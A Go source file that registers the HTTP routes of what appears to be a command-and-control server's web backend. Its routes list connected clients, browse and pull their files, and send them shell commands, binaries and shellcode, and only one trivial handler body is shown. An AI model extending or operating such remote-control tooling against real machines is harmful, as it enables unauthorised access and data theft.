package handlers

import (
	"encoding/json"
	"github.com/Connduit/frazzledrip/server/backend/network"
	"github.com/Connduit/frazzledrip/server/backend/utils"
	"net/http"
)

// RegisterHandlers connects frontend API routes to their backend handlers.
func RegisterHandlers() {
	// List the non-executable attack and script placeholders available in the tools catalog.
	http.HandleFunc("/tool-catalog", toolCatalogHandler)

	// Record a simulated tool task and test result without contacting a client.
	http.HandleFunc("/simulate-tool", simulateToolHandler)

	// Retrieve saved task summaries or the details and output of one task.
	http.HandleFunc("/task-history", taskHistoryHandler)

	// Retrieve recent server audit events for the Event Viewer and audit history.
	http.HandleFunc("/audit-history", auditHistoryHandler)

	// Read cached directory listings or request a new listing from the selected client.
	http.HandleFunc("/browse-files", browseFilesHandler)

	// Request that the selected client upload a file to the server; acknowledge dispatch.
	http.HandleFunc("/download-file", downloadFilePlaceholderHandler)

	// Explicitly associate a live connection with a previously saved session.
	http.HandleFunc("/link-session", linkSessionHandler)

	// Stop accepting new TCP connections while preserving existing sessions.
	http.HandleFunc("/stop-listener", stopListenerHandler)

	// Report TCP listener status, bind address, and bound port.
	http.HandleFunc("/listener-status", listenerStatusHandler)

	// Close a selected session's connection while retaining its saved information.
	http.HandleFunc("/disconnect-session", disconnectSessionHandler)

	// Start the default TCP listener and report any bind failure.
	http.HandleFunc("/start-listener", startListenerHandler)

	// List snapshots of active and saved offline client sessions.
	http.HandleFunc("/get-clients", getClientsHandler)

	// Retrieve the selected client's recent incoming messages and session metadata.
	http.HandleFunc("/get-client-messages", getClientMessagesHandler)

	// Dispatch a shell command through the client's EXECUTE_COMMAND message handler.
	http.HandleFunc("/send-command", sendCommandHandler)

	// Request native host information through the existing SYS_INFO message handler.
	http.HandleFunc("/my-send-command", mySendCommandHandler)

	// Accept a file from the browser and send it to the selected client.
	http.HandleFunc("/send-binary", sendBinaryHandler)

	// Accept shellcode from the browser and dispatch it to the client's shellcode handler.
	http.HandleFunc("/send-shellcode", sendShellcodeHandler)

	// Retrieve the selected client's collected system information.
	http.HandleFunc("/get-client-info", getClientInfoHandler)
}

func getClientsHandler(w http.ResponseWriter, r *http.Request) {
	utils.EnableCORS(&w, r)
	clients := network.GetAllClients()
	json.NewEncoder(w).Encode(clients)
}
